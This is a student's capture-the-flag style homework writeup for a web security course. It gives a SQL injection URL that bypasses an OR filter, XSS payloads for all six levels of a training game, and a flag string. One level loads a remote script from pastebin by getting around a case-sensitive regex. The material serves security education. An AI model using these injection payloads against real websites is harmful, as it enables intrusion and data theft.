# Writeup 1 - Web I

Name: Chris Tharratt
Section: 0101

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: Christopher Tharratt


## Assignment details
This assignment has two parts. It is due by 11/27/19 at 11:59PM.

**There will be late penalty of 5% per day late!**

### Part 1 (40 Pts)

Such a Quick Little, website!

[http://142.93.136.81:5000/](http://142.93.136.81:5000/)

`CMSC389R-{y0u_ar3_th3_SQ1_ninj@}`

Found by exploiting a SQL injection in the URL of the website. Saw that they were using
id=0, 1, 2.. in their URL, which indicates a SQL databse. Using the injection from the 
slides and changing the OR to be || since OR is detected to be a SQL inejection, we 
can then find the flag. 
`http://142.93.136.81:5000/item?id=0'||'1'='1'-- -`

### Part 2 (60 Pts)
Complete all 6 levels of:

[https://xss-game.appspot.com](https://xss-game.appspot.com)

Produce a writeup. We will not take off points for viewing the source code and/or viewing hints, but we strongly discourage reading online write-ups as that defeats the purpose of the homework.

1. `<script>alert('all your scripts are belong to us')</script>` into the search bar. 

2.  `<img src="image.gif" onerror=alert("all your img are belong to us")>` into the status.
This one was a bit tricky since I didn't know much javascript or about the onerror status.

3. `' onerror="alert('all your frame are belone to us')"` into the URL.
Bit trickier, needed the hints and how frames worked. Didn't know that they could have an
onerror event. 

4. `'); alert('all your time are belong to us` into the timer box. 
Needed some hints with this one. Kept trying to utilize the text box to inject some
commands but couldn't get it to work for a while. Found a similar example online to how 
to get it to work.

5. `next=javascript:alert('all your groov are belong to us')` into the URL.
Easier to exploit than some of the others, just needed to know to use javascript: to
execute. 

6. `frame#HTTPS://pastebin.com/raw/xkzNc7Jd` into the URL.
Looking at the source code it was prety easy to avoid the regex by having HTTPS instead 
of https. Using pastebin as an easy vector to write the alert, all I needed to do was to
tell the site to go to that raw pastebin file. 
 

### Format

Part 1 and 2 can be answered in bullet form or full, grammatical sentences.

### Scoring

* Part 1 is worth 40 points
* Part 2 is worth 60 points

### Tips

Remember to document your thought process for maximum credit!

Review the slides for help with using any of the tools or libraries discussed in
class.
